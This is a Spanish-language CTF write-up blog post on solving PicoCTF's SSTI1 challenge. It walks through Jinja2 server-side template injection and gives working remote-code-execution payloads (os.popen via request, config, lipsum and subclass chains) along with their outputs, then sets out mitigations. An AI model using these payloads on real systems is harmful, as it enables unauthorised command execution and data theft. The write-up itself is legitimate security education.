---
title: "SSTI1 PicoCTF: Mi Primera Template Injection"
date: 2025-06-13
lastmod: 2025-06-13
description: "Análisis paso a paso de cómo descubrí y exploté mi primera vulnerabilidad Server-Side Template Injection"
tags: ["SSTI", "PicoCTF", "Web Exploitation", "Jinja2"]
categories: ["CTF Writeups", "Web Exploitation"]
difficulty: "⭐⭐⭐"
ctf_platform: "PicoCTF"
points: 400
author: "Emilinho"
draft: false
featured: true
---

# SSTI1 PicoCTF: Mi Primera Template Injection

{{< section "techsec" >}}
## 🎯 El Reto que Cambió Mi Perspectiva

Cuando me enfrenté por primera vez a SSTI1 en PicoCTF, no tenía idea de que estaba a punto de descubrir una de las 
vulnerabilidades más elegantes y peligrosas del mundo web. Este writeup documenta mi proceso completo de resolución.
{{< /section >}}

<div class="ctf-info">
<strong>📋 Información del Reto</strong><br>
<strong>Plataforma:</strong> PicoCTF<br>
<strong>Categoría:</strong> Web Exploitation<br>
<strong>Puntos:</strong> 400<br>
<div class="difficulty-stars">⭐⭐⭐</div>
<strong>Herramientas:</strong> Browser, Burp Suite (opcional), Documentación PortSwigger<br>
<strong>Tiempo invertido:</strong> 3 horas (incluyendo investigación)<br>
<strong>Fecha de resolución:</strong> 15 de enero, 2024
</div>

## 🔍 Reconocimiento Inicial

Lo primero que hice fue visitar la aplicación web. A simple vista, parecía un formulario básico que procesaba input del 
usuario. El hint de la plataforma mencionaba "Server Side Template Injection", así que sabía hacia dónde dirigir mi investigación.

### 🌐 Análisis de la Aplicación Web

Al acceder a la URL del desafío encontré:
- Una página web simple con un formulario de entrada
- Un campo de texto donde podía ingresar contenido
- La salida se mostraba dinámicamente en la página
- No había filtros obvios en el frontend

### 📚 Investigación Previa

Antes de lanzarme a probar payloads al azar, dediqué tiempo a entender qué es SSTI. Consulté la documentación de PortSwigger:

**🔗 Fuente**: [PortSwigger SSTI Guide](https://portswigger.net/web-security/server-side-template-injection)

{{< highlight-box type="techsec" title="💡 ¿Qué es Server-Side Template Injection?" >}}
SSTI ocurre cuando user input es insertado directamente en templates del lado del servidor, permitiendo a atacantes 
ejecutar código en el contexto del servidor.
{{< /highlight-box >}}

## 🧪 Proceso de Testing

### Paso 1: Identificando la Vulnerabilidad

Según la documentación de PortSwigger, diferentes template engines responden de manera distinta a ciertos payloads. 
El truco está en usar payloads que generen resultados únicos:

```bash
# Primer intento - Testing básico
{{7*7}}
# Resultado: {{7*7}} (sin procesar)

# Segundo intento - Diferentes sintaxis
${7*7}
# Resultado: ${7*7} (sin procesar)

# Tercer intento - Jinja2 syntax
${{7*7}}
# Resultado: 49 ✅
```

{{< highlight-box type="techsec" title="🚨 El Momento Eureka" >}}
Cuando inserté `${{7*7}}` y vi que el servidor me devolvió `49` en lugar del string literal, supe que había encontrado 
la vulnerabilidad. ¡El servidor estaba procesando mi input como código!
{{< /highlight-box >}}

### Paso 2: Identificando el Template Engine

El siguiente paso era determinar qué motor de plantillas estaba usando el servidor. Probé el payload diferenciador:

```bash
# Payload de identificación
${{7*'7'}}
# Resultado: 7777777
```

Según la documentación, este resultado (`7777777`) indica que estamos trabajando con **Jinja2**, el motor de plantillas 
popular en Python/Flask.

### Paso 3: Explorando el Contexto Disponible

Una vez confirmado Jinja2, exploré qué objetos estaban disponibles en el contexto del template:

```python
# Explorando variables globales
${{config}}
# Resultado: Información de configuración de Flask

# Explorando el objeto request
${{request}}
# Resultado: Objeto request disponible

# Explorando métodos disponibles
${{request.__class__}}
# Resultado: <class 'werkzeug.local.LocalProxy'>
```

## 🛠️ Desarrollo del Exploit

Con Jinja2 identificado y el contexto explorado, busqué recursos específicos para explotar este motor de plantillas:

**🔗 Recursos consultados**:
- [OnSecurity SSTI with Jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
- [PayloadsAllTheThings - SSTI](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

### Paso 4: Verificando Ejecución de Comandos

Antes de buscar el flag, quise confirmar que podía ejecutar comandos del sistema:

```python
# Primer intento - Payload clásico
${{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Resultado: uid=0(root) gid=0(root) groups=0(root)
```

¡Perfecto! Tenía ejecución de comandos como root. El `.popen('id')` ejecuta el comando del sistema `id` en Unix/Linux, 
mostrando información del usuario actual.

### Paso 5: Explorando el Sistema

Una vez confirmada la RCE (Remote Code Execution), procedí a explorar:

```python
# Listando archivos en el directorio actual
${{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
# Resultado: __pycache__ app.py flag requirements.txt
```

¡Ahí estaba! Un archivo llamado `flag`. Pero quise más información:

```python
# Listado detallado
${{request.application.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}
# Resultado:
# total 12
# drwxr-xr-x 1 root root   25 May 22 21:36 .
# drwxr-xr-x 1 root root   23 May 22 21:36 ..
# drwxr-xr-x 2 root root   32 May 22 21:36 __pycache__
# -rwxr-xr-x 1 root root 1241 Mar  6 03:27 app.py
# -rw-r--r-- 1 root root   58 Mar  6 19:44 flag
# -rwxr-xr-x 1 root root  268 Mar  6 03:27 requirements.txt
```

### Paso 6: Obteniendo el Flag

Con la confirmación de que el archivo `flag` existía y era legible, ejecuté el payload final:

```python
# Payload final - Leyendo el flag
${{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
# Resultado: picoCTF{s*****_*****_*****_*****}
```

{{< section "techsec" >}}
## 🎉 ¡Flag Obtenido!

¡Éxito! El servidor me devolvió el flag completo: **`picoCTF{s*****_*****_*****_*****}`**

La sensación fue indescriptible: una mezcla de triunfo técnico, comprensión profunda del attack vector, y respeto por 
la elegancia del exploit.
{{< /section >}}

## 🧠 Análisis Técnico Profundo

### ¿Por qué Funcionó Este Exploit?

1. **Template Engine Vulnerable**: La aplicación usaba Jinja2 sin sandboxing
2. **Input Sin Sanitizar**: User input se insertaba directamente en el template
3. **Contexto Privilegiado**: La aplicación corría con permisos de root
4. **Acceso al Filesystem**: El motor de plantillas tenía acceso al sistema de archivos
5. **Objetos Peligrosos Disponibles**: `request`, `config` y otros objetos Flask accesibles

### Anatomía del Payload

```python
${{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

Desglosando cada parte:

- `request.application`: Accede al objeto aplicación Flask
- `__globals__`: Diccionario de variables globales del módulo
- `__builtins__`: Funciones built-in de Python
- `__import__('os')`: Importa el módulo `os` dinámicamente
- `.popen('cat flag')`: Ejecuta el comando `cat flag` en el sistema
- `.read()`: Lee la salida del comando y la retorna como string

### Variaciones del Payload

Durante mi investigación, encontré varias formas de lograr RCE:

```python
# Usando config object
${{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}

# Usando lipsum (función disponible en Jinja2)
${{lipsum.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

# Accediendo a subclasses
${{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat flag').read()}}
```

## 🛡️ Mitigación y Defensa

Como ethical hacker, siempre analizo cómo defenderse contra los ataques que aprendo:

### ❌ Enfoques Insuficientes

```python
# Sanitización básica (fácil de bypassear)
import re
def weak_sanitize(user_input):
    dangerous_patterns = [r'\{\{.*\}\}', r'\{%.*%\}']
    for pattern in dangerous_patterns:
        user_input = re.sub(pattern, '', user_input)
    return user_input

# Blacklist approach (siempre bypasseable)
banned_words = ['import', 'os', 'subprocess', 'eval']
```

### ✅ Defensas Efectivas

```python
# 1. Usar Sandboxed Environment
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()

# 2. Validación estricta de input (whitelist)
def validate_input(user_input):
    # Solo permitir caracteres alfanuméricos y espacios
    if not re.match(r'^[a-zA-Z0-9\s]+$', user_input):
        raise ValueError("Input contains invalid characters")
    return user_input

# 3. Templates precompilados
# Evitar construcción dinámica de templates

# 4. Contexto limitado
# Pasar solo variables específicas necesarias
context = {'user_name': sanitized_name}
template.render(context)

# 5. Principio de menor privilegio
# No ejecutar la aplicación como root
# Usar contenedores con permisos restringidos
```

### 🔒 Configuración Segura en Producción

```python
# Configuración segura de Flask + Jinja2
from jinja2 import Environment, select_autoescape
from jinja2.sandbox import SandboxedEnvironment

# Entorno sandboxed
env = SandboxedEnvironment(
    autoescape=select_autoescape(['html', 'xml']),
    finalize=lambda x: x if x is not None else ''
)

# Configuración de Flask
app.config.update(
    SECRET_KEY='your-secret-key',
    TEMPLATES_AUTO_RELOAD=False,  # En producción
    SEND_FILE_MAX_AGE_DEFAULT=31536000,
)

# Headers de seguridad
@app.after_request
def after_request(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
```

## 🎯 Lecciones Aprendidas

{{< highlight-box type="techsec" title="1. La Investigación es Clave" >}}
Dedicar tiempo a entender la vulnerabilidad antes de explotar ahorra horas de trial-and-error. La documentación de 
PortSwigger fue invaluable.
{{< /highlight-box >}}

{{< highlight-box type="techsec" title="2. Metodología Sistemática" >}}
Seguir un proceso estructurado: identificar → confirmar → explorar → explotar. Cada paso construye sobre el anterior.
{{< /highlight-box >}}

{{< highlight-box type="techsec" title="3. Entender el Contexto" >}}
No solo encontrar la vulnerabilidad, sino entender por qué existe y cómo funciona a nivel técnico. Esto ayuda en la defensa.
{{< /highlight-box >}}

{{< highlight-box type="techsec" title="4. Documentar Todo" >}}
Cada payload, cada resultado, cada hipótesis. La documentación detallada es clave para el aprendizaje y la reproducibilidad.
{{< /highlight-box >}}

{{< highlight-box type="techsec" title="5. Pensar Como Defensor" >}}
Cada vulnerabilidad encontrada debe ir acompañada de conocimiento sobre cómo mitigarla. Attack y defense van de la mano.
{{< /highlight-box >}}

## 🚴‍♂️ Reflexión Personal

{{< section "rutas" >}}
Resolver este CTF fue como completar una subida difícil en bicicleta. Al principio, la pendiente (la vulnerabilidad) 
parecía imposible de superar. Pero paso a paso, pedaleada a pedaleada (payload a payload), fui progresando hasta llegar 
a la cima (el flag).

Esta experiencia me enseñó que en cybersecurity, como en ciclismo, la persistencia metodológica es más valiosa que la 
velocidad pura. No se trata de ser el más rápido ejecutando payloads, sino de entender profundamente cada paso del proceso.

El momento más satisfactorio no fue obtener el flag, sino ese "click" mental cuando entendí cómo Jinja2 procesa los 
objetos y cómo podía navegar por la estructura de Python para llegar al módulo `os`. Ese entendimiento profundo es lo 
que me permitirá reconocer y explotar SSTI en futuros desafíos.
{{< /section >}}

## 📊 Estadísticas del Reto

- **⏱️ Tiempo total**: 3 horas
- **🔍 Tiempo de investigación**: 1 hora
- **🧪 Tiempo de testing**: 1.5 horas  
- **📝 Tiempo de documentación**: 30 minutos
- **🎯 Payloads probados**: ~15
- **✅ Payloads exitosos**: 4
- **📚 Recursos consultados**: 5 fuentes principales

## 🔧 Herramientas Utilizadas

### Principales
- **Firefox Developer Tools**: Análisis de requests/responses
- **Burp Suite Community**: Interceptar y modificar payloads
- **Terminal**: Testing de comandos para verificar sintaxis

### Recursos de Investigación
- **PortSwigger Web Security Academy**: Teoría y methodology
- **PayloadsAllTheThings**: Repositorio de payloads
- **HackTricks**: Técnicas específicas de SSTI
- **Jinja2 Documentation**: Entender el template engine

## 📚 Recursos para Profundizar

### Documentación Oficial
- **[PortSwigger SSTI Guide](https://portswigger.net/web-security/server-side-template-injection)** - La guía más completa
- **[Jinja2 Documentation](https://jinja.palletsprojects.com/)** - Documentación oficial del template engine
- **[OWASP SSTI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)** - Testing guide oficial

### Recursos Prácticos
- **[PayloadsAllTheThings - SSTI](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)** - Colección de payloads
- **[HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)** - Técnicas avanzadas
- **[SecLists SSTI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/template-engines-special-vars)** - Wordlists para fuzzing

### Labs para Practicar
- **[PortSwigger Web Security Academy](https://portswigger.net/web-security/server-side-template-injection)** - Labs gratuitos
- **[TryHackMe SSTI Room](https://tryhackme.com/room/learnssti)** - Práctica guiada
- **[VulnHub SSTI VMs](https://www.vulnhub.com/)** - Máquinas vulnerables

### Libros Recomendados
- **"The Web Application Hacker's Handbook"** - Capítulo sobre template injection
- **"Black Hat Python"** - Para entender mejor la explotación en Python

## 🔄 Próximos Pasos en Mi Learning Path

### Challenges Inmediatos
- [ ] **SSTI2 PicoCTF** - El siguiente nivel de este tipo de desafío
- [ ] **Template injection en Twig** - PHP template engine
- [ ] **SSTI en contextos blind** - Sin output visible
- [ ] **Bypass de filtros WAF** - Evasión de protecciones

### Proyectos de Desarrollo
- [ ] **Scanner SSTI personalizado** - Herramienta de detección automática
- [ ] **Wordlist de payloads** - Colección propia basada en experiencia
- [ ] **Lab personal SSTI** - Entorno controlado para testing

### Habilidades Complementarias
- [ ] **Python object introspection** - Navegar estructuras de objetos
- [ ] **Flask/Django internals** - Entender frameworks web Python
- [ ] **Sandboxing techniques** - Métodos de containment

## 🤝 Conectemos y Compartamos Conocimiento

**¿Has trabajado con SSTI antes?** Comparte tu experiencia en los comentarios.
**¿Tienes dudas sobre algún paso?** No dudes en contactarme:

- **📧 Email**: [emilinhone@protonmail.com](mailto:emilinhone@protonmail.com)
- **🐦 Twitter**: [@emilinho](https://twitter.com/emilinho)
- **💼 LinkedIn**: [Emilio](https://linkedin.com/in/emilinho)
- **🔗 GitHub**: [github.com/emilinho](https://github.com/Emilio-J4n3z)

**¿Encontraste otros vectores en este reto?** ¡Me encantaría conocerlos y aprender de tu enfoque!

## 🌟 Serie CTF Writeups

Este writeup es parte de mi serie completa de CTF writeups. Otros posts relacionados:

### 📝 Writeups Publicados
- **[Buffer Overflow Básico: Cuando la Memoria se Desborda](../buffer-overflow-basics/)** - Próximamente
- **[SQL Injection: Del Error al Shell](../sqli-to-shell/)** - En desarrollo

### 🎯 Próximos Writeups Planeados
- **SSTI Advanced: Bypass Techniques** - Técnicas de evasión
- **XSS to Account Takeover** - Escalación de XSS
- **JWT Attacks in Practice** - Vulnerabilidades en tokens

---

{{< section "techsec" >}}
## 🔐 Recordatorio Ético

Este conocimiento debe usarse únicamente para:
- **🎓 Propósitos educativos**: Aprender y enseñar ciberseguridad
- **🧪 Testing autorizado**: Penetration testing con permiso explícito
- **🛡️ Defensive security**: Mejorar las defensas de sistemas propios
- **🏆 CTF competitions**: Competencias éticas de hacking

**Nunca uses estas técnicas en sistemas que no te pertenecen sin autorización explícita.**

La diferencia entre un ethical hacker y un criminal es el consentimiento y la intención. Mantengamos nuestra comunidad 
ética y profesional.
{{< /section >}}

---

*"Every vulnerability is a lesson in both attack and defense. Today I learned about SSTI, tomorrow I'll help someone 
defend against it."* - **Emilinho**

*"La verdadera maestría en ciberseguridad no está en encontrar vulnerabilidades, sino en entender por qué existen y 
cómo prevenirlas."* - **Emilinho**
